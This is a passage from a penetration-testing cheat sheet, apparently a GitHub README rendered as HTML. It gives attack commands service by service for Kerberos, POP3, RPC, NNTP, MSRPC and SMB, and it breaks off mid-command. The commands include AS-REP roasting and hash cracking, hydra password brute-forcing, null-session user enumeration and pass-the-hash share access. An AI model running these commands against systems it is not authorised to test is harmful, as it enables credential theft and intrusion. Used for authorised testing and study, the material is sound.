0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# username enumeration with Kerbrute\n./kerbrute userenum --dc DC_IP -d DOMAINNAME userlist.txt\n\n# dump all LDAP users\nimpacket-GetADUsers -all -no-pass -dc-ip DC_IP DOMAIN.tld/\nimpacket-GetADUsers -all -dc-ip DC_IP DOMAIN.tld/user:password\n\n# ASREPRoasting - Kerberos attack that allows password hashes to be retrieved\n# for users that do not require pre-authentication (user has Do not use\n# Kerberos pre-authentication enabled).\n# Find ASREPRoastable users and password hashes (slash after domain required)\nimpacket-GetNPUsers -dc-ip DC_IP -usersfile found-users.txt DOMAIN.tld/\n# be sure to crack the hashes to retrieve the passwords\nhashcat -m 18200 /path/to/hashfile.txt /usr/share/wordlists/rockyou.txt --force\n\n# alternate method (done locally on windows box):\n# uses: https://github.com/GhostPack/Rubeus\nRubeus.exe asreproast /format:john /outfile:hash.txt\n\n# list SMB shares with hash of asreproasted user\nsmbclient '\\\\VICTIM_IP\\sharename' -L DC_IP -W DOMAIN -U username%NTHASH --pw-nt-hash\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e username enumeration with Kerbrute\u003c/span\u003e\n./kerbrute userenum --dc DC_IP -d DOMAINNAME userlist.txt\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dump all LDAP users\u003c/span\u003e\nimpacket-GetADUsers -all -no-pass -dc-ip DC_IP DOMAIN.tld/\nimpacket-GetADUsers -all -dc-ip DC_IP DOMAIN.tld/user:password\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ASREPRoasting - Kerberos attack that allows password hashes to be retrieved\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e for users that do not require pre-authentication (user has Do not use\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kerberos pre-authentication enabled).\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Find ASREPRoastable users and password hashes (slash after domain required)\u003c/span\u003e\nimpacket-GetNPUsers -dc-ip DC_IP -usersfile found-users.txt DOMAIN.tld/\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e be sure to crack the hashes to retrieve the passwords\u003c/span\u003e\nhashcat -m 18200 /path/to/hashfile.txt /usr/share/wordlists/rockyou.txt --force\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e alternate method (done locally on windows box):\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e uses: https://github.com/GhostPack/Rubeus\u003c/span\u003e\nRubeus.exe asreproast /format:john /outfile:hash.txt\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list SMB shares with hash of asreproasted user\u003c/span\u003e\nsmbclient \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\\\VICTIM_IP\\sharename\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e -L DC_IP -W DOMAIN -U username%NTHASH --pw-nt-hash\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.8 POP - 110,995\u003c/h2\u003e\u003ca id=\"user-content-28-pop---110995\" class=\"anchor\" aria-label=\"Permalink: 2.8 POP - 110,995\" href=\"#28-pop---110995\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePost Office Protocol (POP) retrieves email from a remote mail server.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# banner grabbing\nnc -nvC $VICTIM_IP 110\nopenssl s_client -connect $VICTIM_IP:995 -crlf -quiet\n\n# basic scan\nnmap -n -v -p110 -sV --script=\u0026quot;pop3-* and safe\u0026quot; -oA nmap/pop3 $VICTIM_IP\n\n# Bruteforcing\nhydra -V -f -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $VICTIM_IP pop3\nhydra -V -f -S -l USERNAME -P /path/to/passwords.txt -s 995 $VICTIM_IP pop3\n\n# user enum / log in\nnc -nvC $VICTIM_IP 110  # \u0026quot;-C\u0026quot; for \\r\\n line endings, required\ntelnet $VICTIM_IP 110   # alternate method\nUSER username\nPASS password\nLIST # gets list of emails and sizes\nRETR 1 # retrieve first email\n# try real (root) and fake users to see if there is a difference in error msgs\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e banner grabbing\u003c/span\u003e\nnc -nvC \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 110\nopenssl s_client -connect \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e:995 -crlf -quiet\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e basic scan\u003c/span\u003e\nnmap -n -v -p110 -sV --script=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003epop3-* and safe\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -oA nmap/pop3 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Bruteforcing\u003c/span\u003e\nhydra -V -f -l USERNAME -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e pop3\nhydra -V -f -S -l USERNAME -P /path/to/passwords.txt -s 995 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e pop3\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e user enum / log in\u003c/span\u003e\nnc -nvC \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 110  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \"-C\" for \\r\\n line endings, required\u003c/span\u003e\ntelnet \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 110   \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e alternate method\u003c/span\u003e\nUSER username\nPASS password\nLIST \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e gets list of emails and sizes\u003c/span\u003e\nRETR 1 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e retrieve first email\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e try real (root) and fake users to see if there is a difference in error msgs\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.9 RPCbind - 111\u003c/h2\u003e\u003ca id=\"user-content-29-rpcbind---111\" class=\"anchor\" aria-label=\"Permalink: 2.9 RPCbind - 111\" href=\"#29-rpcbind---111\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eGets you list of ports open using RPC services. Can be used to locate NFS\nor rusersd services to pentest next.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# banner grab\nnc -nv $VICTIM_IP 111\n\n# list short summary of rpc services\nrpcinfo -s $VICTIM_IP\n# list ports of rpc services\nrpcinfo -p $VICTIM_IP\n\n# try connecting with null session\nrpcclient -U \u0026quot;\u0026quot; $VICTIM_IP\nrpcclient $\u0026gt; enumdomusers\nrpcclient $\u0026gt; queryuser 0xrid_ID\n# see MSRPC (port 135) for more commands\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e banner grab\u003c/span\u003e\nnc -nv \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 111\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list short summary of rpc services\u003c/span\u003e\nrpcinfo -s \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list ports of rpc services\u003c/span\u003e\nrpcinfo -p \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e try connecting with null session\u003c/span\u003e\nrpcclient -U \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\nrpcclient $\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e enumdomusers\nrpcclient $\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e queryuser 0xrid_ID\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e see MSRPC (port 135) for more commands\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.10 NNTP - 119\u003c/h2\u003e\u003ca id=\"user-content-210-nntp---119\" class=\"anchor\" aria-label=\"Permalink: 2.10 NNTP - 119\" href=\"#210-nntp---119\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eNetwork News Transfer Protocol, allows clients to retrieve (read) and post\n(write) news articles to the NNTP (Usenet) server.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# banner grab, interact/view articles\nnc -nvC $VICTIM_IP 119   # \u0026quot;-C\u0026quot; required for \\r\\n line endings\nHELP  # list help on commands (not always available)\nLIST  # list newsgroups, with 1st and last article numbers in each group\nGROUP newsgroup.name  # select the desired newsgroup to access (e.g. \u0026quot;net.news\u0026quot;)\nLAST  # view last article in newsgroup\nARTICLE msgID   # view article by ID\nNEXT  # go to next article\nQUIT\n# http://www.tcpipguide.com/free/t_NNTPCommands-2.htm\n# https://tools.ietf.org/html/rfc977\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e banner grab, interact/view articles\u003c/span\u003e\nnc -nvC \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 119   \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \"-C\" required for \\r\\n line endings\u003c/span\u003e\nHELP  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list help on commands (not always available)\u003c/span\u003e\nLIST  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list newsgroups, with 1st and last article numbers in each group\u003c/span\u003e\nGROUP newsgroup.name  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e select the desired newsgroup to access (e.g. \"net.news\")\u003c/span\u003e\nLAST  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view last article in newsgroup\u003c/span\u003e\nARTICLE msgID   \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view article by ID\u003c/span\u003e\nNEXT  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e go to next article\u003c/span\u003e\nQUIT\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e http://www.tcpipguide.com/free/t_NNTPCommands-2.htm\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e https://tools.ietf.org/html/rfc977\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.11 MSRPC and NetBIOS - 135,137,139\u003c/h2\u003e\u003ca id=\"user-content-211-msrpc-and-netbios---135137139\" class=\"anchor\" aria-label=\"Permalink: 2.11 MSRPC and NetBIOS - 135,137,139\" href=\"#211-msrpc-and-netbios---135137139\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePort 135 is MSRPC. Port 139 is NetBIOS (legacy: 137, 138?), which is tied to SMB for backwards compatibility of session management and name services.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# see the services available through MSRPC\nimpacket-rpcdump $VICTIM_IP | tee rpcdump.log\n# lsa/samr ones let you enumerate users\n\n# interact with MSRPC\n# via null session:\nrpcclient $VICTIM_IP -U \u0026quot;\u0026quot; -N\n# authenticated:\nrpcclient $VICTIM_IP -W DOMAIN -U username -P password\n# from here can enumerate users, groups, etc.\n# (netshareenum, lookupnames, lookupsids, enumdomusers, ...)\nsrvinfo           # query server info\nquerydispinfo     # list users\nenumdomusers      # list users\nenumdomgroups     # list groups\nenumdomains       # list domains\nquerydominfo      # domain info\nlsaquery          # get SIDs\nlsaenumsid        # get SIDs\nlookupsids \u0026lt;sid\u0026gt;  # lookup SID\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e see the services available through MSRPC\u003c/span\u003e\nimpacket-rpcdump \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tee rpcdump.log\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e lsa/samr ones let you enumerate users\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e interact with MSRPC\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e via null session:\u003c/span\u003e\nrpcclient \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e -U \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -N\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e authenticated:\u003c/span\u003e\nrpcclient \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e -W DOMAIN -U username -P password\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e from here can enumerate users, groups, etc.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e (netshareenum, lookupnames, lookupsids, enumdomusers, ...)\u003c/span\u003e\nsrvinfo           \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e query server info\u003c/span\u003e\nquerydispinfo     \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list users\u003c/span\u003e\nenumdomusers      \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list users\u003c/span\u003e\nenumdomgroups     \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list groups\u003c/span\u003e\nenumdomains       \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list domains\u003c/span\u003e\nquerydominfo      \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e domain info\u003c/span\u003e\nlsaquery          \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get SIDs\u003c/span\u003e\nlsaenumsid        \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get SIDs\u003c/span\u003e\nlookupsids \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003esid\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e lookup SID\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUsers enumeration\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003cstrong\u003eList users\u003c/strong\u003e: \u003ccode\u003equerydispinfo\u003c/code\u003e and \u003ccode\u003eenumdomusers\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGet user details\u003c/strong\u003e: \u003ccode\u003equeryuser \u0026lt;0xrid\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGet user groups\u003c/strong\u003e: \u003ccode\u003equeryusergroups \u0026lt;0xrid\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGET SID of a user\u003c/strong\u003e: \u003ccode\u003elookupnames \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGet users aliases\u003c/strong\u003e: \u003ccode\u003equeryuseraliases [builtin|domain] \u0026lt;sid\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eGroups enumeration\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003cstrong\u003eList groups\u003c/strong\u003e: \u003ccode\u003eenumdomgroups\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGet group details\u003c/strong\u003e: \u003ccode\u003equerygroup \u0026lt;0xrid\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGet group members\u003c/strong\u003e: \u003ccode\u003equerygroupmem \u0026lt;0xrid\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eAliasgroups enumeration\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003cstrong\u003eList alias\u003c/strong\u003e: \u003ccode\u003eenumalsgroups \u0026lt;builtin|domain\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGet members\u003c/strong\u003e: \u003ccode\u003equeryaliasmem builtin|domain \u0026lt;0xrid\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eDomains enumeration\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003cstrong\u003eList domains\u003c/strong\u003e: \u003ccode\u003eenumdomains\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGet SID\u003c/strong\u003e: \u003ccode\u003elsaquery\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDomain info\u003c/strong\u003e: \u003ccode\u003equerydominfo\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eMore SIDs\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003cstrong\u003eFind SIDs by name\u003c/strong\u003e: \u003ccode\u003elookupnames \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFind more SIDs\u003c/strong\u003e: \u003ccode\u003elsaenumsid\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRID cycling (check more SIDs)\u003c/strong\u003e: \u003ccode\u003elookupsids \u0026lt;sid\u0026gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# dump user information\n# can also add creds: [[domain/]username[:password]@]\u0026lt;VictimIP\u0026gt;\nimpacket-samrdump -port 139 $VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e dump user information\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can also add creds: [[domain/]username[:password]@]\u0026lt;VictimIP\u0026gt;\u003c/span\u003e\nimpacket-samrdump -port 139 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.12 SMB - 445\u003c/h2\u003e\u003ca id=\"user-content-212-smb---445\" class=\"anchor\" aria-label=\"Permalink: 2.12 SMB - 445\" href=\"#212-smb---445\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003ePort 445 is Server Message Block (SMB).\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eUse \u003ccode\u003eenum4linux\u003c/code\u003e or \u003ccode\u003esmbmap\u003c/code\u003e to gather tons of basic info (users, groups, shares, etc.)\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eDefinitely look at \u003ca href=\"https://book.hacktricks.xyz/pentesting/pentesting-smb\" rel=\"nofollow\"\u003eHackTricks\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eSMB Scans:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# get netbios names of computers, and usernames\ncrackmapexec smb VICTIM_IP/24\nsudo nbtscan -r $VICTIM_IP/24 # force port 137, which Win95 hosts need to respond\nnbtscan $VICTIM_IP/24\n\n# check null sessions\ncrackmapexec smb VICTIM_IP/24 -u '' -p ''\n\n# check guest login\ncrackmapexec smb VICTIM_IP/24 -u 'guest' -p ''\n\n# enumerate hosts with SMB signing not required\ncrackmapexec smb VICTIM_IP/24 --gen-relay-list ntlm-relayers.txt\n\n# list shares\nsmbmap -H $VICTIM_IP\n# try with '-u guest' if getting \u0026quot;[!] Authentication error\u0026quot;\n# try with '-u null -p null'\n\n# list (only) windows version\nsmbmap -vH 